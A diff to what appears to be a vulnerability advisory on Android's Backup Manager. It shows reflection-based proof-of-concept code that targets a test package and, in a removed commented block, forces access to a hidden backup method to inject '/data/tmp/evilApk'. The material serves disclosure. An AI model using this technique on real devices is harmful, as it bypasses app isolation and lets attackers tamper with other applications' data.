@@ -13,7 +13,7 @@ The backup manager, which invokes the custom BackupAgent's does not filter the d
 The Backup Manager can be exploited through simple reflection:
 
 ```
-	  String packageName = "com.searchlab.wifitest"; // getPackageName();
+	  String packageName = "com.searchlab.wifitest"; // package name of the application to be injected
 	  
 	  Method backupToTar;
 	  Method getData;
@@ -35,16 +35,7 @@ The Backup Manager can be exploited through simple reflection:
 		    
 			Log.v("MYBACKUP", "backuptotar invoked!");
 			
-			/*
-			FullBackup.backupToTar(getPackageName(), domain, null, rootpath, filePath, output.getData());
-			Class<?> hs = Class.forName("java.util.HashSet");
-			m = BackupAgent.class.getDeclaredMethod("fullBackupFileTree", String.class, String.class, String.class, hs, FullBackupDataOutput.class);
-	      //m.invoke(d);//exception java.lang.IllegalAccessException
-	      m.setAccessible(true);//Abracadabra 
-	      m.invoke(this, packageName, "", "/data/tmp/evilApk", null, data);//now its ok
-	      */
 		} catch (Exception e) {
-			// TODO Auto-generated catch block
 			e.printStackTrace();
 		}
 ```
